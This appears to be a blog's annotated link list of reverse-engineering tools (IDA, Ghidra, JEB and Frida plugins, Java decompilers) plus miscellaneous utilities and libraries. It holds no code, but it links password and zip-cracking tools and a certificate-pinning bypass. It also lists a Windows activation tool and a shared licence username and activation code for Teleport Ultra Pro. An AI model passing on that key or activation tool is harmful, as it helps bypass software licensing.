<h1 id="IDA-Pro-插件"><a href="#IDA-Pro-插件" class="headerlink" title="IDA Pro 插件"></a>IDA Pro 插件</h1><p><a href="https://github.com/airbus-cert/comida">comida</a> - An IDA Plugin that help analyzing module that use COM.</p>
<p><a href="https://github.com/cseagle/blc">blc</a> - Integrate Ghidra’s decompiler as an Ida plugin.</p>
<p><a href="https://github.com/danigargu/deREferencing">deREferencing</a> - IDA Pro plugin that implements more user-friendly register and stack views.</p>
<p><a href="https://github.com/push0ebp/ALLirt">ALLIRT</a> - Tool that converts All of libc to signatures for IDA Pro FLIRT Plugin. and utility make sig with FLAIR easily.</p>
<p><a href="https://github.com/a1ext/auto_re">auto_re</a> - IDA PRO auto-renaming plugin with tagging support.</p>
<p><a href="https://github.com/RevSpBird/HightLight">HightLight</a> - a plugin for ida of version 7.2 to help know F5 window codes better.</p>
<p><a href="https://github.com/RicBent/Classy">Classy</a> - IDA Pro plugin to manage classes.</p>
<p><a href="https://github.com/chrisps/Hexext">Hexext</a> - Hexext is a plugin to improve the output of the hexrays decompiler through microcode manipulation.</p>
<p><a href="https://github.com/polymorf/findcrypt-yara">findcrypt-yara</a> - IDA pro plugin to find crypto constants (and more).</p>
<p><a href="https://github.com/Cisco-Talos/GhIDA">GhIDA</a> - GhIDA is an IDA Pro plugin that integrates the Ghidra decompiler in IDA.</p>
<p><a href="https://github.com/tmr232/ida_ipython">ida_ipython</a> - An IDA Pro Plugin for embedding an IPython Kernel.</p>
<p><a href="https://github.com/patois/abyss">abyss</a> - abyss - IDAPython Plugin for Postprocessing of Hexrays Decompiler Output.</p>
<p><a href="https://github.com/patois/hexrays_scripts">hexrays_scripts</a> - Various scripts for the Hexrays decompiler.</p>
<p><a href="https://github.com/patois/dsync">dsync</a> - IDAPython plugin that synchronizes disassembler and decompiler views.</p>
<p><a href="https://github.com/patois/HRDevHelper">HRDevHelper</a> - HexRays decompiler plugin that visualizes the ctree of decompiled functions.</p>
<p><a href="https://github.com/patois/IDAPyHelper">IDAPyHelper</a> - IDAPyHelper is a script for the Interactive Disassembler that helps writing IDAPython scripts and plugins.</p>
<p><a href="https://github.com/patois/IDACyber">IDACyber</a> - Data Visualization Plugin for IDA Pro.</p>
<p><a href="https://github.com/ioncodes/idacode">IDACode</a> - An integration for IDA and VS Code which connects both to easily execute and debug IDAPython scripts.</p>
<p><a href="https://github.com/gaasedelen/lighthouse">lighthouse</a> - A Code Coverage Explorer for IDA Pro &amp; Binary Ninja.</p>
<p><a href="https://github.com/topics/ida-plugin">ida-plugin</a> - ida-plugin topics.</p>
<p><a href="https://github.com/onethawt/idaplugins-list">idaplugins-list</a> - A list of IDA Plugins.</p>
<p><a href="https://github.com/CheckPointSW/Karta">Karta</a> - Karta - source code assisted fast binary matching plugin for IDA.</p>
<p><a href="https://github.com/patois/HexraysToolbox">HexraysToolbox</a> - Hexrays Toolbox - IDAPython script for finding code patterns using Hexrays.</p>
<p><a href="https://github.com/REhints/HexRaysCodeXplorer">HexRaysCodeXplorer</a> - Hex-Rays Decompiler plugin for better code navigation.</p>
<p><a href="https://github.com/0xgalz/Virtuailor">Virtuailor</a> - IDAPython tool for creating automatic C++ virtual tables in IDA Pro.</p>
<p><a href="https://github.com/binarly-io/efiXplorer">efiXplorer</a> - IDA plugin for UEFI firmware analysis and reverse engineering automation.</p>
<p><a href="https://github.com/binaryai/sdk">binaryai</a> - BinaryAI Python SDK.</p>
<p><a href="https://github.com/Chordp/PatternGen">PatternGen</a> - ida sig pattern generate pulgin.</p>
<p><a href="https://github.com/oct0xor/highlight2">highlight2</a> - IDA Pro plugin that changes color of call instructions and works with all architectures.</p>
<p><a href="https://github.com/fireeye/flare-ida">flare-ida</a> - IDA Pro utilities from FLARE team.</p>
<p><a href="https://github.com/blackberry/pe_tree">pe_tree</a> - Python module for viewing Portable Executable (PE) files in a tree-view using pefile and PyQt5. Can also be used with IDA Pro to dump in-memory PE files and reconstruct imports.</p>
<p><a href="https://github.com/repnz/ida-plugins">ida-plugins</a> -A collection of my IDA plugins.</p>
<p><a href="https://github.com/LeadroyaL/IDA_ARM_Unwind">IDA_ARM_Unwind</a> - IDA plugin, unwind stack trace when debugging arm.</p>
<p><a href="https://github.com/synacktiv/bip">bip</a> - Bip is a project which aimed to simplify the usage of python for interacting with IDA.</p>
<p><a href="https://github.com/zyantific/IDASkins">IDASkins</a> - Advanced skinning plugin for IDA Pro .</p>
<p><a href="https://gitlab.com/bluedevil/ida-pro-solarized-theme">ida-pro-solarized-theme</a> - Solarized Theme for IDA Pro 7.3+.</p>
<p><a href="https://github.com/fireeye/FIDL">FIDL</a> - FLARE IDA Decompiler Library.</p>
<p><a href="https://github.com/tkmru/idapm">idapm</a> - idapm is IDA Plugin Manager via GitHub Repository.</p>
<p><a href="https://github.com/hasherezade/ida_ifl">ida_ifl</a> - IFL - Interactive Functions List (plugin for IDA Pro).</p>
<p><a href="https://github.com/ChiChou/IDA-ObjCExplorer">IDA-ObjCExplorer</a> - Objective C classdump for IDA Pro.</p>
<p><a href="https://github.com/lucasg/idamagnum">idamagnum</a> - idamagnum is a plugin for integrating MagnumDB requests within IDA.</p>
<p><a href="https://github.com/gaasedelen/lucid">lucid</a> - An Interactive Hex-Rays Microcode Explorer.</p>
<p><a href="https://github.com/fboldewin/COM-Code-Helper">COM-Code-Helper</a> - Two IDAPython Scripts help you to reconstruct Microsoft COM<br>(Component Object Model) Code.</p>
<p><a href="https://github.com/nccgroup/SusanRTTI">SusanRTTI</a> - Another RTTI Parsing IDA plugin.</p>
<p><a href="https://github.com/medigate-io/ida_medigate">ida_medigate</a> - Medigate plugin for c++ reverse engineering and other utils.</p>
<p><a href="https://github.com/0x1shyboy1/MiasmPlugin">MiasmPlugin</a> - This is a IDA plugin that integrates several modules of miasm.</p>
<p><a href="https://github.com/nologic/idaref">idaref</a> - IDA Pro Instruction Reference Plugin.</p>
<p><a href="https://github.com/hluwa/genmc-dom">genmc-dom</a> - Display Hex-Rays Microcode.</p>
<p><a href="https://github.com/jendabenda/fingermatch">fingermatch</a> - FingerMatch is IDA plugin for collecting functions, data, types and comments from analysed binaries and fuzzy matching them in another binaries.</p>
<p><a href="https://github.com/ajkhoury/SigMaker-x64">SigMaker-x64</a> - IDA Pro 7 compatible SigMaker plugin.</p>
<p><a href="https://github.com/L4ys/LazyIDA">LazyIDA</a> - Make your IDA Lazy!</p>
<p><a href="https://github.com/L4ys/IDASignsrch">IDASignsrch</a> - IDA_Signsrch in Python.</p>
<p><a href="https://github.com/patois/FuncScanner">FuncScanner</a> - Collects extended function properties from IDA Pro databases.</p>
<p><a href="https://github.com/lda-project">lda-project</a> - Topic modeling with latent Dirichlet allocation using Gibbs sampling.</p>
<p><a href="https://lumen.abda.nl/">Lumen</a> - Lumen compatible with IDA Pro’s Lumina.</p>
<p><a href="https://github.com/synacktiv/lumina_server">lumina_server</a> - Local server for IDA Lumina feature.</p>
<p><a href="https://github.com/repnz/ida-plugins">reg_xref</a> - Register Cross References.</p>
<p><a href="https://github.com/tacnetsol/ida">ida</a> - Collection of IDA Python plugins&#x2F;scripts&#x2F;modules.</p>
<p><a href="https://github.com/cellebrite-srl/PacXplorer">PacXplorer</a> - About<br>IDA plugin to find code cross references to virtual functions using PAC codes.</p>
<p><a href="https://github.com/fireeye/capa">capa</a> - FLARE团队的开源工具可识别可执行文件中的功能。</p>
<p><a href="https://github.com/joxeankoret/idamagicstrings">idamagicstrings</a> - An IDA Python script to extract information from string constants.</p>
<p>[d810]{<a href="https://gitlab.com/eshard/d810%7D">https://gitlab.com/eshard/d810}</a> - D-810 is an IDA Pro plugin which can be used to deobfuscate code at decompilation time by modifying IDA Pro microcode.</p>
<p><a href="https://github.com/SentineLabs/Memloader">Memloader</a> - Memory loader is a DLL based on IDA SDK that allows you to load files into IDA and reverse them without writing the actual file to the disk. </p>
<p><a href="https://github.com/gaasedelen/tenet">tenet</a> - A Trace Explorer for Reverse Engineers.</p>
<p><a href="https://github.com/arizvisa/ida-minsc">ida-minsc</a> - IDA-minsc is a plugin for IDA Pro that assists a user with scripting the IDAPython plugin that is bundled with the disassembler. </p>
<p><a href="https://github.com/danielplohmann/idascope">idascope</a> - An IDA Pro extension for easier (malware) reverse engineering.</p>
<p><a href="https://github.com/TakahiroHaruyama/ida_haru">ida_haru</a> - scripts&#x2F;plugins for IDA Pro.</p>
<p><a href="https://github.com/ax330d/hrdev">hrdev</a> - Hex-Rays Decompiler Enhanced View.</p>
<p><a href="https://github.com/ax330d/functions-plus">functions-plus</a> - IDA Pro plugin to show functions in a tree view.</p>
<p><a href="https://github.com/giladreich/ida_migrator">ida_migrator</a> - IDA Migrator is an IDA Pro plugin which helps migrating current work from one idb instance to another. Giving the ability to conveniently migrate function names, structures and enums.</p>
<p><a href="https://github.com/Maximus-/cfold">cfold</a> - Slightly better IDA code folding.</p>
<p><a href="https://github.com/hugsy/ida-headless">ida-headless</a> - IDA (sort of) headless.</p>
<p><a href="https://github.com/airbus-cert/Yagi">Yagi</a> - Yet Another Ghidra Integration for IDA.</p>
<p><a href="https://github.com/aliyunav/Finger">Finger</a> - A tool for recognizing function symbol.</p>
<p><a href="https://github.com/Martyx00/CollaRE">CollaRE</a> - Multi-tool reverse engineering collaboration solution.</p>
<p><a href="https://github.com/P4nda0s/LazyIDA">LazyIDA</a> - Make your IDA Lazy!</p>
<p><a href="https://github.com/medigateio/ida_medigate">ida_medigate</a> - Medigate plugin for c++ reverse engineering and other utils.</p>
<p><a href="https://github.com/mandiant/flare-ida">flare-ida</a> - IDA Pro utilities from FLARE team.</p>
<p><a href="https://github.com/SentineLabs/AlphaGolang">AlphaGolang</a> - IDApython Scripts for Analyzing Golang Binaries.</p>
<p><a href="https://github.com/strazzere/golang_loader_assist">golang_loader_assist</a> - Making GO reversing easier in IDA Pro.</p>
<p><a href="https://github.com/0xjiayu/go_parser">go_parser</a> - Yet Another Golang binary parser for IDAPro.</p>
<p><a href="https://github.com/Jinmo/ifred">ifred</a> - IDA command palette &amp; more (Ctrl+Shift+P, Ctrl+P).</p>
<p><a href="https://github.com/lucasg/findrpc">findrpc</a> - Idapython script to carve binary for internal RPC structures.</p>
<p><a href="https://github.com/matteyeux/ida-iboot-loader">ida-iboot-loader</a> - IDA loader for Apple’s iBoot, SecureROM and AVPBooter.</p>
<p><a href="https://github.com/alexhude/FRIEND">FRIEND</a> - FRIEND 是一个 IDA 插件，旨在改进反汇编并将注册&#x2F;指令文档直接引入 IDA 视图。</p>
<h1 id="Ghidra-插件"><a href="#Ghidra-插件" class="headerlink" title="Ghidra 插件"></a>Ghidra 插件</h1><p><a href="https://github.com/0ffffffffh/dragondance">dragondance</a> - Binary code coverage visualizer plugin for Ghidra.</p>
<p><a href="https://github.com/RolfRolles/GhidraPAL">GhidraPAL</a> - Ghidra Program Analysis Library.</p>
<p><a href="https://github.com/RolfRolles/HexRaysDeob">HexRaysDeob</a> - Hex-Rays microcode API plugin for breaking an obfuscating compiler.</p>
<p><a href="https://github.com/ghidraninja/ghidra_scripts">ghidra_scripts</a> - Scripts for the Ghidra software reverse engineering suite.</p>
<p><a href="https://github.com/ghidraninja">ghidraninja</a> - Ghidra Ninja.</p>
<p><a href="https://github.com/andr3colonel/ghidra_wasm">ghidra_wasm</a> - Module to load WebAssembly files into ghidra.</p>
<p><a href="https://github.com/d3v1l401/FindCrypt-Ghidra">FindCrypt-Ghidra</a> - IDA Pro’s FindCrypt ported to Ghidra, with an updated and customizable signature database <a href="https://d3vsite.org/">https://d3vsite.org/</a>.</p>
<p><a href="https://github.com/enovella/ida2ghidra-kb">ida2ghidra-kb</a> - IDA Pro to Ghidra Key Bindings to feel like if you were in IDA Pro when navigating.</p>
<p><a href="https://github.com/Comsecuris/gdbghidra">gdbghidra</a> - gdbghidra - a visual bridge between a GDB session and GHIDRA.</p>
<p><a href="https://github.com/toor-de-force/Ghidra-to-LLVM">Ghidra-to-LLVM</a> - An binary-to-LLVM IR lifter that leverages Ghidra’s IR and analysis.</p>
<p><a href="https://github.com/astrelsky/Ghidra-Cpp-Class-Analyzer">Ghidra-Cpp-Class-Analyzer</a> - Ghidra C++ Class and Run Time Type Information Analyzer.</p>
<p><a href="https://github.com/AllsafeCyberSecurity/awesome-ghidra">awesome-ghidra</a> - A curated list of awesome Ghidra materials.</p>
<p><a href="https://github.com/0xb0bb/pwndra">pwndra</a> - A collection of pwn&#x2F;CTF related utilities for Ghidra.</p>
<p><a href="https://github.com/cetfor/GhidraSnippets">GhidraSnippets</a> - Python snippets for Ghidra’s Program and Decompiler APIs.</p>
<p><a href="https://github.com/fuzzywalls/ghidra_scripts">ghidra_scripts</a> - Port of devttyS0’s IDA plugins to the Ghidra plugin framework, new plugins as well.</p>
<p><a href="https://github.com/astrelsky/vscode-ghidra-skeleton">vscode-ghidra-skeleton</a> - VSCode Ghidra Plugin&#x2F;Script Skeletons.</p>
<p><a href="https://github.com/googleinterns/ghidra-nsis-extension">ghidra-nsis-extension</a> - ghidra-nsis-extension.</p>
<p><a href="https://github.com/reb311ion/emerald">emerald</a> - Import DynamoRIO drcov code coverage data into Ghidra.</p>
<p><a href="https://github.com/0x6d696368/ghidra-data">ghidra-data</a> - 支持Ghidra的数据档案 <a href="https://www.nsa.gov/ghidra">https://www.nsa.gov/ghidra</a>.</p>
<p><a href="https://github.com/felberj/gotools">gotools</a> - Plugin for Ghidra to assist reversing Golang binaries.</p>
<p><a href="https://github.com/meromwolff/Ghidra-EFI-Byte-Code-Processor">Ghidra-EFI-Byte-Code-Processor</a> - A Ghidra processor module for the EFI Byte Code (EBC).</p>
<p><a href="https://github.com/Dump-GUY/ghidra_scripts">ghidra_scripts</a> - Scripts for the Ghidra software reverse engineering suite.</p>
<p><a href="https://github.com/PAGalaxyLab/ghidra_scripts">ghidra_scripts</a> - Scripts for the Ghidra.</p>
<p><a href="https://github.com/0x36/ghidra_kernelcache">ghidra_kernelcache</a> - a Ghidra framework for iOS kernelcache reverse engineering.</p>
<p><a href="https://github.com/justfoxing/ghidra_bridge">ghidra_bridge</a> - Python 3 bridge to Ghidra’s Python scripting.</p>
<p><a href="https://github.com/Nalen98/AngryGhidra">AngryGhidra</a> - Angr plugin for Ghdira.</p>
<p><a href="https://github.com/daenerys-sre/source">Daenerys</a> - Daenerys: A framework for interoperability between IDA and Ghidra.</p>
<p><a href="https://github.com/0x6d696368/ghidra-data/tree/master/typeinfo">typeinfo</a> - Ghidra Data Type.</p>
<p><a href="https://github.com/Ayrx/JNIAnalyzer">JNIAnalyzer</a> - Analysis scripts for Ghidra to work with Android NDK libraries.</p>
<p><a href="https://github.com/revolver-ocelot-saa/GhidraX64Dbg">GhidraX64Dbg</a> - Extract annoations from Ghidra into an X32&#x2F;X64 dbg database.</p>
<p><a href="https://github.com/garyttierney/intellij-ghidra">intellij-ghidra</a> - An IntelliJ IDEA plugin for working on Ghidra Extensions.</p>
<p><a href="https://github.com/garyttierney/ghidra-batteries-included">ghidra-batteries-included</a> - Builds of Ghidra 9.2 with additional components included.</p>
<p><a href="https://github.com/schlafwandler/ghidra_SavePatch">ghidra_SavePatch</a> - A Ghidra script to save small patches back to the executable file.</p>
<p><a href="https://github.com/fmagin/ghidra_scripts">ghidra_scripts</a> - ghidra_scripts.</p>
<p><a href="https://github.com/Cuyler36/CodeWarriorDemangler">CodeWarriorDemangler</a> - Code Warrior Demangler Extension for Ghidra.</p>
<p><a href="https://github.com/0x6d696368/ghidra_scripts">ghidra_scripts</a> - Ghidra scripts such as a RC4 decrypter, Yara search, stack string decoder, etc.</p>
<p><a href="https://github.com/reb311ion/replica">replica</a> - Ghidra Analysis Enhancer.</p>
<p><a href="https://github.com/kohnakagawa/gdt_halper">gdt_halper</a> - Ghidra Data Type (GDT) Helper.</p>
<p><a href="https://github.com/HackOvert/GhidraSnippets">GhidraSnippets</a> - Ghidra 的程序和反编译器 API 的 Python 片段.</p>
<p><a href="https://github.com/cmu-sei/kaiju">kaiju</a> - CERT Kaiju 是 Ghidra 软件逆向工程套件的二进制分析框架扩展。</p>
<h1 id="Jeb-Pro-插件"><a href="#Jeb-Pro-插件" class="headerlink" title="Jeb Pro 插件"></a>Jeb Pro 插件</h1><p><a href="https://github.com/LeadroyaL/JebScript">JebScript</a> - Some usefull Jeb Script.</p>
<p><a href="https://github.com/S3cuRiTy-Er1C/JebScripts">JebScripts</a> -  通过sourceInfo恢复类名，兼容jeb2和jeb3的API.</p>
<p><a href="https://github.com/acbocai/jeb_script">jeb_script</a> - 一些常用的基础的代码分析操作,可用于反混淆&#x2F;路径分析&#x2F;代码定位等.</p>
<p><a href="https://github.com/2Y2s1mple/JebScript">JebScript</a> - A bunch of JEB python scripts.</p>
<p><a href="https://github.com/yoavst/JebOps">JebOps</a> - Handy utils for reversing android apps in JEB.</p>
<h1 id="Frida-工具"><a href="#Frida-工具" class="headerlink" title="Frida 工具"></a>Frida 工具</h1><p><a href="https://github.com/tacesrever/frida-tsplugin">frida-tsplugin</a> - typescript autocomplete plugin for frida’s java warpper.</p>
<p><a href="https://github.com/FuzzySecurity/Fermion">Fermion</a> - Fermion, an electron wrapper for Frida &amp; Monaco.</p>
<p><a href="https://github.com/0x742/noia">noia</a> - Simple Android application sandbox file browser tool. Powered by <a href="https://www.frida.re/">frida.re</a>.</p>
<p><a href="https://github.com/chame1eon/jnitrace-engine">jnitrace-engine</a> - Engine used by jnitrace to intercept JNI API calls.</p>
<p><a href="https://github.com/chame1eon/jnitrace">jnitrace</a> - A Frida based tool that traces usage of the JNI API in Android apps.</p>
<p><a href="https://github.com/ChiChou/vscode-frida">vscode-frida</a> - Unofficial frida extension for VSCode.</p>
<p><a href="https://github.com/GoSecure/frida-xamarin-unpin">frida-xamarin-unpin</a> - A Frida script to bypass Xamarin certificate pinning implementations.</p>
<p><a href="https://github.com/Ch0pin/medusa">medusa</a> - Medusa is an extensible framework for Android applications which automates processes and techniques practised during the dynamic analysis of a malware investigation.</p>
<p><a href="https://github.com/iddoeldor/frida-snippets">frida-snippets</a> - Hand-crafted Frida examples.</p>
<h1 id="Java-逆向"><a href="#Java-逆向" class="headerlink" title="Java 逆向"></a>Java 逆向</h1><p><a href="https://github.com/Col-E/Recaf">Recaf</a> - The modern Java bytecode editor.</p>
<p><a href="https://github.com/GraxCode/JByteMod-Beta">JByteMod</a> - Java bytecode editor.</p>
<p><a href="https://github.com/Konloch/bytecode-viewer">bytecode-viewer</a> - A Java 8+ Jar &amp; Android APK Reverse Engineering Suite (Decompiler, Editor, Debugger &amp; More).</p>
<p><a href="https://github.com/skylot/jadx">jadx</a> - Dex to Java decompiler.</p>
<p><a href="https://github.com/java-decompiler/jd-gui">jd-gui</a> - A standalone Java Decompiler GUI.</p>
<p><a href="https://github.com/deathmarine/Luyten">Luyten</a> - An Open Source Java Decompiler Gui for Procyon.</p>
<p><a href="https://github.com/leibnitz27/cfr">CFR</a> - This is the public repository for the CFR Java decompiler.</p>
<p><a href="https://github.com/LLVM-but-worse/java-disassembler">java-disassembler</a> - The Java Disassembler.</p>
<p><a href="https://github.com/GraxCode/cafecompare">cafecompare</a> - Java code comparison tool (jar &#x2F; class).</p>
<p><a href="https://github.com/castor-software/decompilercmp">decompilercmp</a> - Dataset and tool to analyse and compare java bytecode decompilers.</p>
<p><a href="https://github.com/Col-E/Recaf">Recaf</a> - A modern Java bytecode editor.</p>
<p><a href="https://github.com/GraxCode/cafecompare">cafecompare</a> - Java code comparison tool (jar &#x2F; class)</p>
<p><a href="https://github.com/GraxCode/Cafebabe">Cafebabe</a> - Easy-to-use java bytecode editor - successor of JByteMod!</p>
<h1 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h1><p><a href="https://github.com/VSCodium/vscodium">vscodium</a> -它就是 VS Code 的一个分支，但它删除 VS Code 原版收集用户数据的功能。如果你不信任微软，如果你是一个开源纯粹主义者，可以试试。</p>
<p><a href="https://github.com/Eloston/ungoogled-chromium">Ungoogled Chromium</a>- 它是 Chromium 的分支，但是把 Google Web 服务依赖全都移除了！</p>
<p><a href="https://github.com/nico/demumble">demumble</a> - A better c++filt and a better undname.exe, in one binary.</p>
<p><a href="https://github.com/TGSAN/CMWTAT_Digital_Edition">CMWTAT_Digital_Edition</a> - win10激活工具，火绒不报错，开源工具，永久数字证书.</p>
<p><a href="https://github.com/barry-ran/QtScrcpy">QtScrcpy</a> - Android real-time display control software.</p>
<p><a href="https://github.com/CoatiSoftware/Sourcetrail">Sourcetrail</a> - Sourcetrail-免费和开源的交互式资源管理器.</p>
<p><a href="https://github.com/flameshot-org/flameshot">flameshot</a> - flameshot 是一个功能强大且易用的截图软件.</p>
<p><a href="https://github.com/easymodo/qimgv">qimgv</a> - Qt5 image viewer with optional video support.</p>
<p><a href="https://github.com/d2phap/ImageGlass">ImageGlass</a> - A lightweight, versatile image viewer.</p>
<p><a href="http://www.tenmax.com/Teleport_Pro_Installer.exe">Teleport Ultra Pro</a> - 整站下载工具。用户名：<code>zbezj</code> 激活码：<code>664504030</code>  <a href="https://macyoyo.cn/html/732.html">来源</a>。</p>
<p><a href="https://github.com/Leon406/ToolsFx">ToolsFx</a> - 基于kotlin+tornadoFx开发的跨平台密码学工具箱.包含编解码,编码转换,加解密, 哈希,MAC,签名,二维码功能,ctf等实用功能,支持插件。</p>
<p><a href="https://github.com/tldr-pages/tldr">tldr</a> - 控制台命令的协作备忘单.</p>
<p><a href="https://github.com/Awesome-Windows/Awesome">Awesome-Windows</a> - 适用于 Windows 的最佳应用程序和工具的精选列表。</p>
<p><a href="https://github.com/iCHAIT/awesome-macOS">awesome-macOS</a> - 适用于 macOS 的精选应用程序、软件、工具和闪亮事物的精选列表。</p>
<p><a href="https://github.com/ashishb/android-security-awesome">android-security-awesome</a> - A collection of android security related resources.</p>
<p><a href="https://github.com/luong-komorebi/Awesome-Linux-Software">Awesome-Linux-Softwar</a> - About<br>A list of awesome applications, software, tools and other materials for Linux distros.</p>
<p><a href="https://github.com/Hack-with-Github/Awesome-Hacking">Awesome-Hacking</a> - A collection of various awesome lists for hackers, pentesters and security researchers.</p>
<p><a href="https://github.com/Ciphey/Ciphey">Ciphey</a> - Automatically decrypt encryptions without knowing the key or cipher, decode encodings, and crack hashes.</p>
<p><a href="https://github.com/L-codes/pwcrack-framework">pwcrack-framework</a> - pwcrack-framework 是一个用Ruby编写的密码自动破解框架，目前提供了 25 个在线破解和 25 个离线破解接口，支持 48 种算法破解。</p>
<p><a href="https://github.com/YerongAI/Office-Tool">Office-Tool</a> - Office Tool Plus 本地化项目，用于 Office 部署的强大且有用的工具。</p>
<p><a href="https://github.com/VShawn/PRemoteM">PRemoteM</a> - PRemoteM 是一款现代的远程会话管理和启动器，它让你能够在任何时候快速开启一个远程会话。目前 PRemoteM 已支持 微软远程桌面(RDP)、VNC、SSH、Telnet、SFTP, FTP, RemoteApp等协议。</p>
<p><a href="https://github.com/wmjordan/PDFPatcher">PDF补丁丁</a> - PDF补丁丁是一个用于修改PDF文件信息的工具。</p>
<p><a href="https://github.com/hiyohiyo/CrystalDiskInfo">CrystalDiskInfo</a> - CrystalDiskInfo is a disk information tool.</p>
<p><a href="https://github.com/joyqi/sfz">sfz</a> - 专门用于给图片加水印打码的工具</p>
<p><a href="https://github.com/kimci86/bkcrack">bkcrack</a> - 使用 Biham 和 Kocher 已知的明文攻击破解传统的 zip 加密。</p>
<blockquote>
<p>以下工具来自 ：<a href="https://github.com/yifeitao/learn/wiki/tools">https://github.com/yifeitao/learn/wiki/tools</a><br>windows</p>
</blockquote>
<ul>
<li><p><a href="https://amazing-apps.gitbook.io/windows-apps-that-amaze-us/zh-cn">https://amazing-apps.gitbook.io/windows-apps-that-amaze-us/zh-cn</a></p>
</li>
<li><p><a href="http://www.wepe.com.cn/">http://www.wepe.com.cn/</a></p>
</li>
<li><p><a href="https://chocolatey.org/">https://chocolatey.org/</a></p>
</li>
<li><p><a href="http://msdn.itellyou.cn/">http://msdn.itellyou.cn/</a></p>
</li>
<li><p><a href="https://ninite.com/">https://ninite.com/</a></p>
</li>
<li><p><a href="https://www.nirsoft.net/">https://www.nirsoft.net/</a></p>
</li>
<li><p><a href="https://joplinapp.org/">https://joplinapp.org/</a> 笔记软件 印象笔记替代</p>
</li>
<li><p><a href="https://github.com/hackjutsu/Lepton">https://github.com/hackjutsu/Lepton</a> gist管理软件</p>
</li>
<li><p><a href="https://www.basiccat.org/zh/">https://www.basiccat.org/zh/</a> 翻译辅助软件</p>
</li>
<li><p><a href="https://obsproject.com/">https://obsproject.com/</a> 屏幕录制</p>
</li>
<li><p>linux</p>
</li>
<li><p><a href="https://guacamole.apache.org/">https://guacamole.apache.org/</a></p>
</li>
<li><p>app</p>
</li>
<li><p><a href="https://tox.chat/">https://tox.chat/</a></p>
</li>
<li><p><a href="https://github.com/soimort/you-get">https://github.com/soimort/you-get</a><br>科学上网</p>
</li>
<li><p><a href="https://prism-break.org/zh-CN/">https://prism-break.org/zh-CN/</a></p>
</li>
<li><p><a href="https://www.v2ray.com/">https://www.v2ray.com/</a></p>
</li>
<li><p><a href="https://mysterium.network/">https://mysterium.network/</a></p>
</li>
<li><p><a href="https://github.com/ginuerzh/gost">https://github.com/ginuerzh/gost</a></p>
</li>
<li><p><a href="https://github.com/snooda/net-speeder">https://github.com/snooda/net-speeder</a></p>
</li>
<li><p><a href="https://github.com/trailofbits/algo">https://github.com/trailofbits/algo</a></p>
</li>
<li><p><a href="https://github.com/StreisandEffect/streisand">https://github.com/StreisandEffect/streisand</a></p>
</li>
<li><p><a href="https://github.com/haoel/haoel.github.io#33-%E7%94%A8-gost-%E8%AE%BE%E7%BD%AE-https-%E6%9C%8D%E5%8A%A1">https://github.com/haoel/haoel.github.io#33-%E7%94%A8-gost-%E8%AE%BE%E7%BD%AE-https-%E6%9C%8D%E5%8A%A1</a></p>
</li>
<li><p><a href="https://github.com/xuxiaodong/v2ray-for-ansible">https://github.com/xuxiaodong/v2ray-for-ansible</a></p>
</li>
<li><p><a href="https://github.com/ginuerzh/gost">https://github.com/ginuerzh/gost</a></p>
</li>
<li><p>安全</p>
</li>
<li><p><a href="https://flowerpassword.com/">https://flowerpassword.com/</a></p>
</li>
<li><p><a href="https://monitor.firefox.com/">https://monitor.firefox.com/</a></p>
</li>
<li><p><a href="https://www.pixelpin.io/">https://www.pixelpin.io/</a><br>文本编辑</p>
</li>
<li><p><a href="https://casual-effects.com/markdeep/">https://casual-effects.com/markdeep/</a></p>
</li>
<li><p><a href="https://github.com/zadam/trilium">https://github.com/zadam/trilium</a><br>流程图</p>
</li>
<li><p><a href="https://github.com/jgraph/drawio">https://github.com/jgraph/drawio</a><br>信息获取</p>
</li>
<li><p><a href="https://blogtrottr.com/">https://blogtrottr.com/</a></p>
</li>
<li><p><a href="https://fivefilters.org/">https://fivefilters.org/</a><br>文件中转</p>
</li>
<li><p><a href="http://tmp.link/">http://tmp.link/</a></p>
</li>
<li><p><a href="https://send-anywhere.com/">https://send-anywhere.com/</a></p>
</li>
<li><p><a href="https://www.multcloud.com/">https://www.multcloud.com/</a></p>
</li>
<li><p><a href="https://send.firefox.com/">https://send.firefox.com/</a><br>数据分析</p>
</li>
<li><p><a href="https://me.bdp.cn/home.html">https://me.bdp.cn/home.html</a><br>自动化脚本</p>
</li>
<li><p><a href="http://www.sikulix.com/">http://www.sikulix.com/</a><br>开发文档</p>
</li>
<li><p><a href="https://docusaurus.io/">https://docusaurus.io/</a><br>网站构建</p>
</li>
<li><p><a href="https://www.contentful.com/">https://www.contentful.com/</a><br>媒体创作</p>
</li>
<li><p><a href="https://obsproject.com/">https://obsproject.com/</a><br>其它</p>
</li>
<li><p><a href="https://uzer.me/">https://uzer.me/</a></p>
</li>
<li><p><a href="https://www.ipip.net/">https://www.ipip.net/</a></p>
</li>
<li><p><a href="https://www.wolframalpha.com/">https://www.wolframalpha.com/</a></p>
</li>
<li><p><a href="http://www.globalrichlist.com/">http://www.globalrichlist.com/</a><br>旅行</p>
</li>
<li><p><a href="https://traveladapter.xyz/">https://traveladapter.xyz/</a><br>数据</p>
</li>
<li><p><a href="https://github.com/ricklamers/gridstudio">https://github.com/ricklamers/gridstudio</a><br>图片合成</p>
</li>
<li><p><a href="https://imagemagick.org/">https://imagemagick.org/</a><br>视频处理</p>
</li>
<li><p><a href="https://ffmpeg.org/">https://ffmpeg.org/</a><br>代码运行</p>
</li>
<li><p><a href="https://code.labstack.com/">https://code.labstack.com/</a></p>
</li>
</ul>
<h1 id="python-库"><a href="#python-库" class="headerlink" title="python 库"></a>python 库</h1><p><a href="https://github.com/Delgan/loguru">loguru</a> - Python logging made (stupidly) simple</p>
<p><a href="https://github.com/jmcnamara/XlsxWriter">XlsxWriter</a> - A Python module for creating Excel XLSX files.</p>
<p><a href="https://github.com/microsoft/playwright-python">playwright-python</a> - 微软开源的Python自动化神器 Playwright.</p>
<p><a href="https://github.com/pyppeteer/pyppeteer">pyppeteer</a> - Headless chrome&#x2F;chromium automation library (unofficial port of puppeteer).</p>
<p><a href="https://github.com/ssssssss-team/spider-flow">spider-flow</a> - 新一代爬虫平台，以图形化方式定义爬虫流程，不写代码即可完成爬虫。</p>
<h1 id="JS-库"><a href="#JS-库" class="headerlink" title="JS 库"></a>JS 库</h1><p><a href="https://github.com/lelinhtinh/de4js">de4js</a> - JavaScript Deobfuscator and Unpacker.</p>
<h1 id="C-库"><a href="#C-库" class="headerlink" title="C++ 库"></a>C++ 库</h1><p><a href="https://github.com/stbrumme/hash-library">hash-library</a> - Portable C++ hashing library.</p>
<p><a href="https://github.com/ZLMediaKit/ZLToolKit">ZLToolKit</a> - 一个基于C++11简单易用的轻量级网络编程框架.</p>
